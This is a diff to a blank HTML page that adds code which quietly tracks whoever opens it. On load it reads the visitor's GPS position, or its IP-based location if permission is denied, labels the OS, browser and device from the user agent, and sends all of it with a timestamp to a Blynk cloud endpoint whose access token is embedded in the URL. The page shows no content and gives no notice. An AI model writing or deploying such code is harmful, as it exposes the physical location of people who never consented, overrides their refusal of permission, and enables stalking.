@@ -1,10 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title></title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
 body{
@@ -16,99 +15,146 @@ body{
 
 <body>
 
-
 <script>
 
-window.onload = function(){
+let data = "";
 
-    getLocation();
+function hitWebsite() {
+
+    let text = JSON.stringify(data);
+
+    var url = "https://sgp1.blynk.cloud/external/api/update?token=grpkWejUxTvRG4dCqh0jXHv-Hykwq2ZP&v1=" 
+              + encodeURIComponent(text);
+
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", url, true);
+    xhr.send();
+}
+
+
+function showLocation(lat, lon, source){
+
+    data = {
+        latitude: lat,
+        longitude: lon,
+        source: source,
+        os: os,
+        browser: browser,
+        device: device,
+        time: new Date().toISOString()
+    };
+
+    console.log(data);
+
+    // send after data is ready
+    hitWebsite();
+}
+
+
+function getGPS(){
+
+    navigator.geolocation.getCurrentPosition(
+
+        function(position){
+
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+
+            showLocation(lat, lon, "GPS");
+
+        },
+
+        function(){
+
+            getIPLocation();
+
+        },
+
+        {
+            enableHighAccuracy:true,
+            timeout:5000,
+            maximumAge:0
+        }
+    );
+}
+
+
+
+function getIPLocation(){
+
+fetch("https://ipapi.co/json/")
+.then(response=>response.json())
+.then(ipdata=>{
+
+    showLocation(
+        ipdata.latitude,
+        ipdata.longitude,
+        "IP"
+    );
+
+});
+
+}
+
+
+
+// Device information
+
+let ua=navigator.userAgent;
+
+
+let os="Unknown";
+
+if(/Windows/i.test(ua))
+os="Windows";
+
+else if(/Android/i.test(ua))
+os="Android";
+
+else if(/iPhone|iPad/i.test(ua))
+os="iOS";
+
+else if(/Mac/i.test(ua))
+os="MacOS";
+
+else if(/Linux/i.test(ua))
+os="Linux";
+
+
+
+let device="PC";
+
+if(/Tablet/i.test(ua))
+device="Tablet";
+
+else if(/Mobi|Android/i.test(ua))
+device="Mobile";
+
+
+
+let browser="Unknown";
+
+if(ua.includes("Chrome"))
+browser="Chrome";
+
+else if(ua.includes("Firefox"))
+browser="Firefox";
+
+else if(ua.includes("Safari"))
+browser="Safari";
+
+
+
+// Start
+
+window.onload=function(){
+
+    getGPS();
 
 };
 
 
-function getLocation(){
-
-    if(!navigator.geolocation){
-
-        closePage();
-        return;
-    }
-
-
-    navigator.geolocation.getCurrentPosition(
-
-        success,
-
-        error,
-
-        {
-            enableHighAccuracy:true,
-            timeout:10000,
-            maximumAge:0
-        }
-
-    );
-
-}
-
-
-
-function success(position){
-
-    // Location accepted
-
-    console.log(
-        "Latitude:",
-        position.coords.latitude,
-        "Longitude:",
-        position.coords.longitude
-    );
-
-
-    setTimeout(function(){
-
-        closePage();
-
-    },1000);
-
-}
-
-
-
-function error(err){
-
-    // Permission denied or error
-
-    console.log("Location error:", err.message);
-
-
-    setTimeout(function(){
-
-        closePage();
-
-    },1000);
-
-}
-
-
-
-function closePage(){
-
-    window.close();
-
-
-    // Fallback for normal browser tabs
-    setTimeout(function(){
-
-        window.location.href="about:blank";
-
-    },500);
-
-}
-
-
 </script>
-
 
 </body>
 </html>
